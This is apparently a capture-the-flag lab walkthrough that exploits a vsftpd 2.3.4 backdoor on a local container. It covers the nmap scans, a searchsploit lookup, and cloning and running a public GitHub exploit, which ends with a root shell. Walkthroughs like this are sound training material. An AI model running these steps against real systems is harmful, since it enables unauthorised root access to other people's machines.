# FirstHacking

## Reconnaissance and Enumeration.

Check that the machine is running.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Once we get a ping response, we can start enumerating the machine. The ttl=64 can indicate that it is a **Linux** machine.

We launch nmap to see what ports it finds.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Performs a SYN scan.
- `-p-`: Scans all ports.
- `--open`: Shows only open ports.
- `--min-rate 5000`: Sets the minimum packet sending speed to 5000 per second.
- `-vvv`: Generates very detailed and verbose output.
- `-n`: Avoids reverse DNS resolution.
- `-Pn`: Skips host detection.
- `-oG allPorts`: Saves the results to a file called "allPorts".
- `172.17.0.2`: The IP address of the target host.

```
PORT STATE SERVICE REASON
21/tcp open ftp syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Since we have port 21 open, we are going to check the versions and run some basic scripts to see what information we get.

```bash
nmap -sCV -p21 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Scan for versions and vulnerabilities.
- `-p21`: Scan for ports 21 (FTP).
- `-vvv`: Very verbose and verbose output.
- `-oN versionPorts`: Save the results to "versionPorts".
- `172.17.0.2`: IP address of the scanned host.

```bash
PORT STATE SERVICE REASON VERSION
21/tcp open ftp syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix
```
We see that the ftp version is vsftpd 2.3.4, we check in searchsploit if it is vulnerable and we see if there are exploits that we could use.
```bash
❯ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Exploit Title | Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
## Exploitation.

In this case I'm going to use an exploit that we found in [GITHUB](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit). We follow the instructions on the page and it creates a reverse shell as the root user of the machine.

```bash
sudo python3 -m pip install pwntools
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
cd vsftpd_2.3.4_Exploit/
chmod +x exploit.py
```
```bash
python3 exploit.py 172.17.0.2
```
```bash
❯ python3 exploit.py 172.17.0.2
[+] Got Shell!!!
[+] Opening connection to 172.17.0.2 on port 21: Done
[*] Closed connection to 172.17.0.2 port 21
[+] Opening connection to 172.17.0.2 on port 6200: Done
[*] Switching to interactive mode
$whoami
root
```
